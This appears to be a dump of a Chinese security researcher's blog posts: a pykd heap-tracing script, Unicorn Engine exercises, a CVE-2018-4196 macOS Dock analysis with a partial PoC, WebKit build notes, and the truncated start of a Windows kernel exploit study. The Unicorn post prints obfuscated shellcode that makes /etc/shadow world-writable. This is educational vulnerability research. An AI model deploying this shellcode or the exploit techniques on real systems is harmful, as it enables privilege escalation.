在我还在学校的时候，pwn2own还能参加的时候，从来没有听说过、看到过，360这边因为签序、撞洞的事各种diss，像是受了天大的委屈。签序只是运气问题，撞洞就是储备问题了，与他人无关。 至于你们说报名多队伍，第一，这完全在规则允许的范围之内，而且我们也没撞洞啥的；第二，这招谁开始玩的溜呢？ :) 这几天其实蛮精彩的，不过作为小菜鸟也不敢多说什么，只是发现，高级别的大佬之间，格局的差距原来可以这么大。 翻篇了翻篇了，该开始新的工作了，努力创造更多的价值，希望后面自己可以产出更多0day，更多exploit。 Live long and pwn 最后，放个图","link":"/2018/11/18/TFC%E6%B8%B8%E8%AE%B0/"},{"title":"UAF analysis : using pykd","text":"0x01 : 简介分析一些情况比较复杂的UAF漏洞时，比如很多次分配、使用内存，费力寻找被UAF的对象的释放点，是比较麻烦的(对于我这种菜逼来说)，这时候可以使用pykd来辅助这个工作，能使得漏洞分析工作变得更轻松。 0x02 : 脚本模版这个脚本的原始版本在使用的时候有点问题，我本地测试的时候回调函数有点问题，不能正常使用。 后来咨询了无言学长之后，学长帮忙做了修改: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150import pykdreturn_reg = &quot;rax&quot;stack_pointer = &quot;rsp&quot;arch_bits = 64def get_address(localAddr): res = pykd.dbgCommand(&quot;x &quot; + localAddr) result_count = res.count(&quot;\\n&quot;) if result_count == 0: print localAddr + &quot; not found.&quot; return None if result_count &gt; 1: print &quot;[-] Warning, more than one result for&quot;, localAddr return res.split()[0].replace('`','')# RtlAllocateHeap(# IN PVOID HeapHandle,# IN ULONG Flags,# IN ULONG Size );class handle_allocate_heap(pykd.eventHandler): def __init__(self): addr = get_address(&quot;ntdll!RtlAllocateHeap&quot;) if addr == None: return self.bp_init = pykd.setBp(int(addr, 16), self.enter_call_back) self.bp_end = None def enter_call_back(self): self.out = &quot;RtlAllocateHeap(&quot; if arch_bits == 32: esp = pykd.reg(stack_pointer) self.out += hex(pykd.ptrPtr(esp + 4)) + &quot; , &quot; self.out += hex(pykd.ptrMWord(esp + 0x8)) + &quot; , &quot; self.out += hex(pykd.ptrMWord(esp + 0xC)) + &quot;) = &quot; else: self.out += hex(pykd.reg(&quot;rcx&quot;)) + &quot; , &quot; self.out += hex(pykd.reg(&quot;rdx&quot;)) + &quot; , &quot; self.out += hex(pykd.reg(&quot;r8&quot;)) + &quot;) = &quot; if self.bp_end == None: disas = pykd.dbgCommand(&quot;uf ntdll!RtlAllocateHeap&quot;).split('\\n') for i in disas: if 'ret' in i: self.ret_addr = i.split()[0].replace('`','') break self.bp_end = pykd.setBp(int(self.ret_addr, 16), self.return_call_back) return False def return_call_back(self): pykd.dprintln(self.out + hex(pykd.reg(return_reg)) + &quot;\\n&quot;) return False# RtlFreeHeap(# IN PVOID HeapHandle,# IN ULONG Flags OPTIONAL,# IN PVOID MemoryPointer );class handle_free_heap(pykd.eventHandler): def __init__(self): addr = get_address(&quot;ntdll!RtlFreeHeap&quot;) if addr == None: return self.bp_init = pykd.setBp(int(addr, 16), self.enter_call_back) self.bp_end = None def enter_call_back(self): self.out = &quot;RtlFreeHeap(&quot; if arch_bits == 32: esp = pykd.reg(stack_pointer) self.out += hex(pykd.ptrPtr(esp + 4)) + &quot; , &quot; self.out += hex(pykd.ptrMWord(esp + 0x8)) + &quot; , &quot; self.out += hex(pykd.ptrPtr(esp + 0xC)) + &quot;) = &quot; else: self.out += hex(pykd.reg(&quot;rcx&quot;)) + &quot; , &quot; self.out += hex(pykd.reg(&quot;rdx&quot;)) + &quot; , &quot; self.out += hex(pykd.reg(&quot;r8&quot;)) + &quot;) = &quot; if self.bp_end == None: disas = pykd.dbgCommand(&quot;uf ntdll!RtlFreeHeap&quot;).split('\\n') for i in disas: if 'ret' in i: self.ret_addr = i.split()[0].replace('`','') break self.bp_end = pykd.setBp(int(self.ret_addr, 16), self.return_call_back) return False def return_call_back(self): # returns a BOOLEAN which is a byte under the hood ret_val = hex(pykd.reg(&quot;al&quot;)) pykd.dprintln(self.out + ret_val + &quot;\\n&quot;) return False# RtlReAllocateHeap(# IN PVOID HeapHandle,# IN ULONG Flags,# IN PVOID MemoryPointer,# IN ULONG Size );class handle_realloc_heap(pykd.eventHandler): def __init__(self): addr = get_address(&quot;ntdll!RtlReAllocateHeap&quot;) if addr == None: return self.bp_init = pykd.setBp(int(addr, 16), self.enter_call_back) self.bp_end = None def enter_call_back(self): self.out = &quot;RtlReAllocateHeap(&quot; if arch_bits == 32: esp = pykd.reg(stack_pointer) self.out += hex(pykd.ptrPtr(esp + 4)) + &quot; , &quot; self.out += hex(pykd.ptrMWord(esp + 0x8)) + &quot; , &quot; self.out += hex(pykd.ptrPtr(esp + 0xC)) + &quot; , &quot; self.out += hex(pykd.ptrMWord(esp + 0x10)) + &quot;) = &quot; else: self.out += hex(pykd.reg(&quot;rcx&quot;)) + &quot; , &quot; self.out += hex(pykd.reg(&quot;rdx&quot;)) + &quot; , &quot; self.out += hex(pykd.reg(&quot;r8&quot;)) + &quot; , &quot; self.out += hex(pykd.reg(&quot;r9&quot;)) + &quot;) = &quot; if self.bp_end == None: disas = pykd.dbgCommand(&quot;uf ntdll!RtlReAllocateHeap&quot;).split('\\n') for i in disas: if 'ret' in i: self.ret_addr = i.split()[0].replace('`','') break self.bp_end = pykd.setBp(int(self.ret_addr, 16), self.return_call_back) return False def return_call_back(self): pykd.dprintln(self.out + hex(pykd.reg(return_reg)) + &quot;\\n&quot;) return Falsetry: pykd.reg(&quot;rax&quot;)except: arch_bits = 32 return_reg = &quot;eax&quot; stack_pointer = &quot;esp&quot;#addr = get_address(&quot;ntdll!RtlReAllocateHeap&quot;)#print addrpykd.removeAllBp()bp_a1 = handle_allocate_heap()bp_a2 = handle_free_heap()bp_a3 = handle_realloc_heap()print 'bps=%x' %pykd.getNumberBreakpoints() 我基于这些模版，写了自己做漏洞分析的时候使用的脚本。 思路也比较简单，就是找到目标对象的分配、释放点，下断点，自动记录分配/释放的内存地址、大小，然后做一个输出供自己分析用。 效果当然是很舒服啦 :) 0x03 : 使用效果目标是大型软件时，windbg会有点卡，等一下就好了。 123456789101112131415161718192021222324252627282930313233&gt; .load pykd&gt; !py -g path/to/script.py&gt; g......RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x276fbff0RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x26af2ff0RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x27657ff0RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x26f1cff0RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x26f1aff0RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x257aaff0RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x257bcff0RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x2694aff0RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x255cfff0RtlFreeHeap(0x950000L , 0x0L , 0x255cfff0L) = 0x1RtlFreeHeap(0x950000L , 0x0L , 0x2694aff0L) = 0x1RtlFreeHeap(0x950000L , 0x0L , 0x257bcff0L) = 0x1RtlFreeHeap(0x950000L , 0x0L , 0x257aaff0L) = 0x1RtlFreeHeap(0x950000L , 0x0L , 0x26f1aff0L) = 0x1...","link":"/2018/11/07/UAF-analysis-using-pykd/"},{"title":"Unicorn Engine初体验","text":"0x00:关于unicorn engineUnicorn Engine是一个模拟器(emulator)，简单的来说就是可以模拟执行程序or片段的代码。对于逆向分析来说很有用，比如分析某个片段的代码的作用；对于漏洞挖掘选手来说，前一段时间的unicorn-afl着实亮眼，不过有带更深入的研究。 0x01:关于本文很巧，今天玄武推送推了一篇Unicorn Engine tutorial，感觉写的很好，作者也很有趣，文章中还布置了home work，哈哈哈，上班的时候没时间做，下班回到家就看了看，模仿者第一个例子，和作者给出的hint把两个home work做了下。 0x02: shellcode分析作者在这里给出了一段混淆过的shellcode，直接反汇编器查看的话，并不能直接分析出这段shellcode的作用。 1shellcode = &quot;\\xe8\\xff\\xff\\xff\\xff\\xc0\\x5d\\x6a\\x05\\x5b\\x29\\xdd\\x83\\xc5\\x4e\\x89\\xe9\\x6a\\x02\\x03\\x0c\\x24\\x5b\\x31\\xd2\\x66\\xba\\x12\\x00\\x8b\\x39\\xc1\\xe7\\x10\\xc1\\xef\\x10\\x81\\xe9\\xfe\\xff\\xff\\xff\\x8b\\x45\\x00\\xc1\\xe0\\x10\\xc1\\xe8\\x10\\x89\\xc3\\x09\\xfb\\x21\\xf8\\xf7\\xd0\\x21\\xd8\\x66\\x89\\x45\\x00\\x83\\xc5\\x02\\x4a\\x85\\xd2\\x0f\\x85\\xcf\\xff\\xff\\xff\\xec\\x37\\x75\\x5d\\x7a\\x05\\x28\\xed\\x24\\xed\\x24\\xed\\x0b\\x88\\x7f\\xeb\\x50\\x98\\x38\\xf9\\x5c\\x96\\x2b\\x96\\x70\\xfe\\xc6\\xff\\xc6\\xff\\x9f\\x32\\x1f\\x58\\x1e\\x00\\xd3\\x80&quot; 1234567# muhe @ muheMacBookPro in /tmp [22:38:29]$ python -c 'shellcode = &quot;\\xe8\\xff\\xff\\xff\\xff\\xc0\\x5d\\x6a\\x05\\x5b\\x29\\xdd\\x83\\xc5\\x4e\\x89\\xe9\\x6a\\x02\\x03\\x0c\\x24\\x5b\\x31\\xd2\\x66\\xba\\x12\\x00\\x8b\\x39\\xc1\\xe7\\x10\\xc1\\xef\\x10\\x81\\xe9\\xfe\\xff\\xff\\xff\\x8b\\x45\\x00\\xc1\\xe0\\x10\\xc1\\xe8\\x10\\x89\\xc3\\x09\\xfb\\x21\\xf8\\xf7\\xd0\\x21\\xd8\\x66\\x89\\x45\\x00\\x83\\xc5\\x02\\x4a\\x85\\xd2\\x0f\\x85\\xcf\\xff\\xff\\xff\\xec\\x37\\x75\\x5d\\x7a\\x05\\x28\\xed\\x24\\xed\\x24\\xed\\x0b\\x88\\x7f\\xeb\\x50\\x98\\x38\\xf9\\x5c\\x96\\x2b\\x96\\x70\\xfe\\xc6\\xff\\xc6\\xff\\x9f\\x32\\x1f\\x58\\x1e\\x00\\xd3\\x80&quot;;print shellcode' &gt; sc.dump# muhe @ muheMacBookPro in /tmp [22:38:37]$ file sc.dumpsc.dump: data 用r2分析的话： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950[0x00000000]&gt; pd 0x00000000 e8ffffffff call 4 0x00000005 c05d6a05 rcr byte [rbp + 0x6a], 5 0x00000009 5b pop rbx 0x0000000a 29dd sub ebp, ebx 0x0000000c 83c54e add ebp, 0x4e ; 'N' 0x0000000f 89e9 mov ecx, ebp 0x00000011 6a02 push 2 ; 2 0x00000013 030c24 add ecx, dword [rsp] 0x00000016 5b pop rbx 0x00000017 31d2 xor edx, edx 0x00000019 66ba1200 mov dx, 0x12 ; 18 ┌─&gt; 0x0000001d 8b39 mov edi, dword [rcx] ⁝ 0x0000001f c1e710 shl edi, 0x10 ⁝ 0x00000022 c1ef10 shr edi, 0x10 ⁝ 0x00000025 81e9feffffff sub ecx, 0xfffffffe ⁝ 0x0000002b 8b4500 mov eax, dword [rbp] ⁝ 0x0000002e c1e010 shl eax, 0x10 ⁝ 0x00000031 c1e810 shr eax, 0x10 ⁝ 0x00000034 89c3 mov ebx, eax ⁝ 0x00000036 09fb or ebx, edi ⁝ 0x00000038 21f8 and eax, edi ⁝ 0x0000003a f7d0 not eax ⁝ 0x0000003c 21d8 and eax, ebx ⁝ 0x0000003e 66894500 mov word [rbp], ax ⁝ 0x00000042 83c502 add ebp, 2 ⁝ 0x00000045 4a85d2 test rdx, rdx └─&lt; 0x00000048 0f85cfffffff jne 0x1d 0x0000004e ec in al, dx 0x0000004f 37 invalid ┌─&lt; 0x00000050 755d jne 0xaf ┌──&lt; 0x00000052 7a05 jp 0x59 ││ 0x00000054 28ed sub ch, ch ││ 0x00000056 24ed and al, 0xed ││ 0x00000058 24ed and al, 0xed │ 0x0000005a 0b887feb5098 or ecx, dword [rax - 0x67af1481] │ 0x00000060 38f9 cmp cl, bh │ 0x00000062 5c pop rsp │ 0x00000063 96 xchg eax, esi │ 0x00000064 2b9670fec6ff sub edx, dword [rsi - 0x390190] │ 0x0000006a c6 invalid │ 0x0000006b ff9f321f581e lcall [rdi + 0x1e581f32] │ 0x00000071 00d3 add bl, dl │ 0x00000073 800aff or byte [rdx], 0xff │ 0x00000076 ff invalid │ 0x00000077 ff invalid │ 0x00000078 ff invalid │ 0x00000079 ff invalid │ 0x0000007a ff invalid │ 0x0000007b ff invalid 事实是啥都看不出来，但是作者说： 1Note that the architecture is x86-32 now. List of syscalls numbers can be found here. 32位的，而且是调用了系统调用搞事情的。那就可以模仿文中的例子，模拟执行这段代码，然后对系统调用打hook，把参数print出来，然后再跳过去。 根据资料，调用号放在eax寄存器，参数的顺序是：ebx,ecx,edx,esi,edi。下面就是hook了int 80h指令，然后搞事情。 我的hook函数： 1234567891011121314151617181920def hook_code(mu, address, size, user_data): op_code = mu.mem_read(address, size) if op_code == &quot;\\xcd\\x80&quot;: call_number = mu.reg_read(UC_X86_REG_EAX) param1 = mu.reg_read(UC_X86_REG_EBX) param2 = mu.reg_read(UC_X86_REG_ECX) param3 = mu.reg_read(UC_X86_REG_EDX) param4 = mu.reg_read(UC_X86_REG_ESI) param5 = mu.reg_read(UC_X86_REG_EDI) print (&quot;[*]Result as followed:&quot;) print (&quot;\\tCall number: {0}&quot;.format(call_number)) print (&quot;\\tParam1 : {0}&quot;.format(param1)) print (&quot;\\tParam2 : {0}&quot;.format(param2)) print (&quot;\\tParam3 : {0}&quot;.format(param3)) print (&quot;\\tParam4 : {0}&quot;.format(param4)) print (&quot;\\tParam5 : {0}&quot;.format(param5)) mu.reg_write(UC_X86_REG_EIP, address + size) 运行结果： 12345678910111213141516 $ python task1.py[*]Result as followed: Call number: 15 Param1 : 4194392 Param2 : 438 Param3 : 0 Param4 : 0 Param5 : 32979[*]Result as followed: Call number: 1 Param1 : 4194392 Param2 : 438 Param3 : 0 Param4 : 0 Param5 : 32979 第四、第五个参数应该没用到，第一次调用时15号调用，第二次是1号调用。查了一下，15号是chmod，1号是exit。chmod的参数应该是文件名，权限。exit的参数的话，就是4194392。 就是想办法确定chmod操作了什么文件，4194392应该是一个指针。修改hook函数： 12345678print (&quot;\\tCall number: {0}&quot;.format(call_number)) if call_number == 15: file = mu.mem_read(param1, 32).split(&quot;\\x00&quot;)[0] print (&quot;\\t[*]File is {0}&quot;.format(file)) else: print (&quot;\\tParam1 : {0}&quot;.format(param1)) 123456789101112131415[*]Result as followed: Call number: 15 [*]File is /etc/shadow Param2 : 438 Param3 : 0 Param4 : 0 Param5 : 32979[*]Result as followed: Call number: 1 Param1 : 4194392 Param2 : 438 Param3 : 0 Param4 : 0 Param5 : 32979 chmod的第二个参数其实就是0666: 123&gt;&gt;&gt; oct(438)'0666'&gt;&gt;&gt; 到此，分析完毕。 0x03: 修改函数的返回值修改下面程序的逻辑，使得返回值是1。 1234567891011121314151617181920212223242526272829303132333435int strcmp(char *a, char *b){ //get length int len = 0; char *ptr = a; while(*ptr) { ptr++; len++; } //comparestrings for(int i=0; i&lt;=len; i++) { if (a[i]!=b[i]) return 1; } return 0;}__attribute__((stdcall))int super_function(int a, char *b){ if (a==5 &amp;&amp; !strcmp(b, &quot;batman&quot;)) { return 1; } return 0;}int main(){ super_function(1, &quot;spiderman&quot;);} 这个也好做，直接调用super_function,然后根据栈的结构，直接把参数改了，因为是x86，c语言的调用约定是从右到左依次压栈，所以字符串spiderman的指针是第一个压栈的。 123456...saved ebpret addr1ptr ---&gt; &quot;spiderman\\0&quot;... 大概就是上面这样。 这部分比较容易，自己编译一个这个程序，然后找一下super_function函数的开头和结尾。 这个bin文件在mac上编译出来，地址啥的不一样，写脚本的时候要注意，bin文件映射地址最好是ida里分析的文件起始地址，这样的话，后面调用super func的时候，地址啥的可以直接用。 123456789101112131415161718192021222324252627282930313233343536373839from unicorn import *from unicorn.x86_const import *import structdef read(name): with open(name) as f: return f.read()def u32(data): return struct.unpack(&quot;I&quot;, data)[0]def p32(num): return struct.pack(&quot;I&quot;, num)mu = Uc (UC_ARCH_X86, UC_MODE_32)BASE = 0x00000000STACK_ADDR = 0x40000000STACK_SIZE = 1024*1024mu.mem_map(BASE, 1024*1024)mu.mem_map(STACK_ADDR, STACK_SIZE)mu.mem_write(BASE, read(&quot;./function&quot;))r_esp = STACK_ADDR + (STACK_SIZE/2) #ESP points to this address at function callSTRING_ADDR = 0x40000000mu.mem_write(STRING_ADDR, &quot;batman\\x00&quot;) #write &quot;batman&quot; somewhere. We have choosen an address 0x0 which belongs to the stack.mu.reg_write(UC_X86_REG_ESP, r_esp) #set ESPmu.mem_write(r_esp+4, p32(5)) #set the first argument. It is integer 5mu.mem_write(r_esp+8, p32(STRING_ADDR)) #set the second argument. This is a pointer to the string &quot;batman&quot;mu.emu_start(0x0000057B, 0x000005B1) #start emulation from the beginning of super_function, end at RET instructionreturn_value = mu.reg_read(UC_X86_REG_EAX)print &quot;The returned value is: %d&quot; % return_value 1234# muhe @ muheMacBookPro in ~/Downloads [15:19:10]$ python task2.pyThe returned value is: 1 0x04: arm32的一个cm类似于作者原文的第一个demo，就是那个ctf题目，只不过这次arch换成了arm32，注意大小端。 1234567int __cdecl __noreturn main(int argc, const char **argv, const char **envp){ int v3; // r0 v3 = ccc(0x2710u, (int)argv, (int)envp); printf((const char *)&amp;unk_745A4, v3);} 在没有arm环境的情况下，使用unicorn来得出这个函数结算结果-。- 虽然我有arm环境 2333333 搜了一下arm传参的方式： 输入参数通过r0-r3传递，多余的放入堆栈中；返回值放入r0，不够的话放入{r0,r1}或者{r0,r1,r2,r3}，比如：int foo(int a, int b, int c, int d), 输入：r0 = a, r1 = b, r2 = c, r3 = d，返回：r0 = 类型为int的retvalueint *foo(char a, double b, int c, char d), 输入：r0 = a, r1用于对齐(double 要求8字节对齐), b = {r2, r3}，c放在堆栈的sp[0]位置，d放在堆栈的sp[4]位置，这里的sp是指进入函数时的sp；返回：r0 = 类型为int *的retvalue 注意如果返回值是结构体，情况有些特殊：struct client foo(int a, char b, float c), 输入：r0 = 一个strcut client *变量，由调用者给出, r1 = a, r2 = b, r3 = c；返回：strcut client *变量，和调用者给的一样 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263from unicorn import *from unicorn.arm_const import *import structdef read(name): with open(name) as f: return f.read() def u32(data): return struct.unpack(&quot;I&quot;, data)[0] def p32(num): return struct.pack(&quot;I&quot;, num)mu = Uc (UC_ARCH_ARM, UC_MODE_LITTLE_ENDIAN)BASE = 0x10000STACK_ADDR = 0x300000STACK_SIZE = 1024*1024mu.mem_map(BASE, 1024*1024)mu.mem_map(STACK_ADDR, STACK_SIZE)mu.mem_write(BASE, read(&quot;./task4_arm&quot;))mu.reg_write(UC_ARM_REG_SP, STACK_ADDR + STACK_SIZE/2)instructions_skip_list = []CCC_START = 0x000104D0CCC_END = 0x00010580stack = [] # Stack for storing the argumentsd = {} # Dictionary that holds return values for given function argumentsdef hook_code(mu, address, size, user_data): if address == CCC_START: # Are we at the beginning of ccc function? arg0 = mu.reg_read(UC_ARM_REG_R0) # Read the first argument. it is passed by R0 if arg0 in d: # Check whether return value for this function is already saved. ret = d[arg0] mu.reg_write(UC_ARM_REG_R0, ret) # Set return value in R0 mu.reg_write(UC_ARM_REG_PC, 0x105BC) # Set PC to point at &quot;BX LR&quot; instruction. We want to return from fibonacci function else: stack.append(arg0) # If return value is not saved for this argument, add it to stack. elif address == CCC_END: arg0 = stack.pop() # We know arguments when exiting the function ret = mu.reg_read(UC_ARM_REG_R0) # Read the return value (R0) d[arg0] = retmu.hook_add(UC_HOOK_CODE, hook_code)mu.emu_start(0x00010584, 0x000105A8)print &quot;ret:{0}&quot;.format(mu.reg_read(UC_ARM_REG_R1)) 123# muhe @ muheMacBookPro in ~/Downloads [15:34:12]$ python task4.pyret:2635833876 0x05: 参考Unicorn Engine tutorial arm平台函数传递参数，反汇编实例分析","link":"/2018/01/15/Unicorn-Engine%E5%88%9D%E4%BD%93%E9%AA%8C/"},{"title":"Uninitialised Objective-C Pointer Vulnerability Analysis (CVE-2018-4196)","text":"infoMWR Lab在pwn2own2018用来macOS上一整套利用的sbx部分漏洞分析，这个漏洞发生在com.apple.dock.server服务，是一个栈指针未初始化。 vuln(10.13’s Dock binary)1234567891011121314v107 = a5;v5 = a3;v105 = a2;v111 = 1;v102 = a4;v6 = (const char *)a4;v98 = a4;v7 = UnserializeCFType(a3, a4, &amp;v89);v8 = objc_autorelease(*(_QWORD *)&amp;v89);v9 = (void *)_objc_retain(v8);v10 = v9;if ( v7 ){... v89未初始化，到这里还造成不了什么问题； 主要是看UnserializeCFType的逻辑，这个函数会call到_AXUnserializeCFType 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152__text:000000000000F043__text:000000000000F043 public _AXUnserializeCFType__text:000000000000F043 _AXUnserializeCFType proc near ; CODE XREF: _UnserializeCFType+16↑j__text:000000000000F043 ; _AXUnserializeWrapper+15↓j ...__text:000000000000F043__text:000000000000F043 var_8 = qword ptr -8__text:000000000000F043__text:000000000000F043 push rbp__text:000000000000F044 mov rbp, rsp__text:000000000000F047 sub rsp, 10h__text:000000000000F04B mov [rbp+var_8], rdx__text:000000000000F04F mov eax, 0FFFF9D8Fh__text:000000000000F054 cmp rcx, 8__text:000000000000F058 jb short loc_F0B7__text:000000000000F05A mov qword ptr [r8], 0__text:000000000000F061 mov esi, [rdx]__text:000000000000F063 cmp esi, 6F77656Eh__text:000000000000F069 jz short loc_F073__text:000000000000F06B cmp esi, 61656C61h__text:000000000000F071 jnz short loc_F0B7__text:000000000000F073__text:000000000000F073 loc_F073: ; CODE XREF: _AXUnserializeCFType+26↑j__text:000000000000F073 lea rax, [rdx+4]__text:000000000000F077 mov [rbp+var_8], rax__text:000000000000F07B mov eax, [rdx+4]__text:000000000000F07E cmp rax, 0Fh__text:000000000000F082 jbe short loc_F08D__text:000000000000F084 lea r9, _bogusUnserialize__text:000000000000F08B jmp short loc_F098__text:000000000000F08D ; ---------------------------------------------------------------------------__text:000000000000F08D__text:000000000000F08D loc_F08D: ; CODE XREF: _AXUnserializeCFType+3F↑j__text:000000000000F08D lea rdx, _sUnserializeFunctions__text:000000000000F094 mov r9, [rdx+rax*8]__text:000000000000F098__text:000000000000F098 loc_F098: ; CODE XREF: _AXUnserializeCFType+48↑j__text:000000000000F098 add rcx, 0FFFFFFFFFFFFFFFCh__text:000000000000F09C xor eax, eax__text:000000000000F09E cmp esi, 6F77656Eh__text:000000000000F0A4 setz al__text:000000000000F0A7 lea rsi, [rbp+var_8]__text:000000000000F0AB mov rdx, rcx__text:000000000000F0AE mov rcx, r8__text:000000000000F0B1 mov r8d, eax__text:000000000000F0B4 call r9 ; _bogusUnserialize__text:000000000000F0B7__text:000000000000F0B7 loc_F0B7: ; CODE XREF: _AXUnserializeCFType+15↑j__text:000000000000F0B7 ; _AXUnserializeCFType+2E↑j__text:000000000000F0B7 add rsp, 10h__text:000000000000F0BB pop rbp__text:000000000000F0BC retn__text:000000000000F0BC _AXUnserializeCFType endp 问题就在于这个函数里对这个未初始化的指针的处理，这个函数也没有初始化这个指针，而是直接判断 cmp rcx, 8，决定是否执行反序列化的操作；然而，rcx是一个可控值，这里可以控制rcx小于8，然后使UnserializeCFType执行失败。 这里回到这个服务的MIG handler函数: 12v7 = UnserializeCFType(a3, a4, &amp;v89);v8 = objc_autorelease(*(_QWORD *)&amp;v89); 它默认UnserializeCFType执行成功，并不考虑任何失败的情况，这就导致后面直接使用这个未初始化的指针作为objc_autorelease的参数。 patch 123456789101112131415161718_text:0000000000010ABD__text:0000000000010ABD public _AXUnserializeCFType__text:0000000000010ABD _AXUnserializeCFType proc near ; CODE XREF: _UnserializeCFType+16↑j__text:0000000000010ABD ; _AXUnserializeWrapper+1A↓j ...__text:0000000000010ABD__text:0000000000010ABD var_8 = qword ptr -8__text:0000000000010ABD__text:0000000000010ABD push rbp__text:0000000000010ABE mov rbp, rsp__text:0000000000010AC1 sub rsp, 10h__text:0000000000010AC5 mov [rbp+var_8], rdx__text:0000000000010AC9 mov qword ptr [r8], 0__text:0000000000010AD0 mov eax, 0FFFF9D8Fh__text:0000000000010AD5 cmp rcx, 8__text:0000000000010AD9 jb short loc_10B31__text:0000000000010ADB mov esi, [rdx]__text:0000000000010ADD cmp esi, 6F77656Eh__text:0000000000010AE3 jz short loc_10AED 在 _AXUnserializeCFType 对之前没初始化的指针先set NULL处理，然后再执行cmp rcx 8。 所以即使之前还是有未初始化的情况，在这里也彻底堵死了。 苹果的这个补法还是挺优雅的，代价也比较小，比一个handler一个handler得去做初始化的工作要方便多了 :-) refapple-safari-pwn2own-vuln-write-up-2018-10-29 伪POC我没看这个洞所在的handler，而是看到了另外的类似的情况，已另外一个handler为目标写的poc : ( 有些字段瞎填的，不影响，找个老版本，改一改字段应该ok。 1234567891011121314151617181920212223242526272829303132333435363738struct dock_msg{ mach_msg_header_t hdr; mach_msg_body_t body; mach_msg_ool_descriptor_t ool_desc; uint32_t PAD[2]; uint32_t ool_size;};struct dock_msg m = {0};//header +0m.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);m.hdr.msgh_bits |= MACH_MSGH_BITS_COMPLEX; // must be complex msgm.hdr.msgh_size = sizeof(struct dock_msg);m.hdr.msgh_remote_port = service_port;m.hdr.msgh_local_port = 0;m.hdr.msgh_voucher_port = 0; //anything you want :-)m.hdr.msgh_id = id;//body must be 1, +0x18m.body.msgh_descriptor_count = 1; int *tmp = malloc(0x1337);//ool desc 12 bytes, +0x1cm.ool_desc.address = tmp;m.ool_desc.deallocate = 0;m.ool_desc.copy = 0;m.ool_desc.pad1 = 0;m.ool_desc.type = 1;m.ool_desc.size = 0x1337; //这个就是 cmp rcx, 8 的rcx// padding, +0x28m.PAD[0] = 0x1337;// ool size +0x34m.ool_size = 0x1337;","link":"/2019/09/09/Uninitialised-Objective-C-Pointer-Vulnerability-Analysis-CVE-2018-4196/"},{"title":"Webkit编译踩坑记录","text":"0x00 : 环境及工具MacOS MoJave 10.14.2 Xcode 10.1 0x01 : 编译过程 下载源码 1https://github.com/WebKit/webkit 官网那个太不稳定了，一直挂着代理还容易断，github这个镜像更稳定。 编译 使用Xcode打开项目，依次打开 File--&gt;Workspace Settings--&gt;，选择Advanced，然后选择Custom，并且在Products和Intermediates中填写WebkitBuild，设置完毕。 其他设置默认就可以了，然后Xcode的菜单栏Procduct--&gt;Build，慢慢等它编译吧，大概不到10分钟的样子就可以编译好。 最后得到: 1234$ lsANGLE.build JavaScriptCore.build PAL.build TestWebKitAPI.build WebInspectorUI.build WebKitTestRunner.build libwebrtc.buildDebug MiniBrowser.build PrecompiledHeaders WTF.build WebKit.build bmalloc.buildDumpRenderTree.build MobileMiniBrowser.build Release WebCore.build WebKitLegacy.build gtest.build 0x02 : 踩坑(dyld: Symbol not found)在运行编译完的binary的时候，我遇到了报错信息: 123456$ ./Debug/jscdyld: Symbol not found: __ZN3JSC10DisallowGC19s_scopeReentryCountE Referenced from: /Users/muhe/Code/webkit/WebKitBuild/./Debug/jsc Expected in: /System/Library/Frameworks/JavaScriptCore.framework/Versions/A/JavaScriptCore in /Users/muhe/Code/webkit/WebKitBuild/./Debug/jsc[1] 64039 abort ./Debug/jsc 搜了很多都无果(可能关键词问题)，问了0x9k师傅之后得到了解决方案，原来官网就有解答 囧 解决方法是：设置DYLD_FRAMEWORK_PATH环境变量。 1export DYLD_FRAMEWORK_PATH=/Users/muhe/Code/webkit/WebKitBuild/Debug 之后就可以正常运行了: 123456$ ./Debug/jsc&gt;&gt;&gt; var test = &quot;Hello jsc&quot;;undefined&gt;&gt;&gt; testHello jsc&gt;&gt;&gt;","link":"/2018/12/31/Webkit%E7%BC%96%E8%AF%91%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/"},{"title":"Windows Kernel Exploit Study(1)","text":"0x00:之前在一个小群里joker师傅给大家推荐了一波Windows Kernel Exploit，这个入门级的windows kernel pwn的资料，正好跟着学习一下内核相关的知识。 0x01: 环境 所用系统说明 物理机 ：windows10 虚拟机 ：xp sp3 cn 过程中用到的工具 Visual Studio 2010 Windbg ProcessExplorer osrloaderv30 0x02: 前期准备首先是双机调试和驱动加载的问题。双机调试的话，首先修改xp的boot.ini文件，该文件在：C:\\boot.ini。添加调试相关的选项，为了方便，我直接加了一个启动项，如图：然后在vmware里给xp虚拟机加一个串口就可以了，配置如下图：然后，进入windbg，选择：File–Kernel Debug，选中COM栏，填写相应的管道的信息，然后就可以开始调试了。 想要断下来然后单步可以直接：Debug———Break，这样就可以断下来了。之后使用osrloaderv30工具去加载目标驱动。 0x03: 分析开始只是准备尝试下最简单的Stackoverflow vuln去提权，关于这部分，驱动的源码如下：这里只贴出来派遣例程部分的代码，漏洞很明显，内核里直接使用了用户层传进来的size进行拷贝工作，而没有做任何的check，导致栈溢出。 12345678910111213141516171819202122232425262728293031323334353637NTSTATUS TriggerStackOverflow(IN PVOID UserBuffer, IN SIZE_T Size) { NTSTATUS Status = STATUS_SUCCESS; ULONG KernelBuffer[BUFFER_SIZE] = {0}; PAGED_CODE(); __try { // Verify if the buffer resides in user mode ProbeForRead(UserBuffer, sizeof(KernelBuffer), (ULONG)__alignof(KernelBuffer)); DbgPrint(\"[+] UserBuffer: 0x%p\\n\", UserBuffer); DbgPrint(\"[+] UserBuffer Size: 0x%X\\n\", Size); DbgPrint(\"[+] 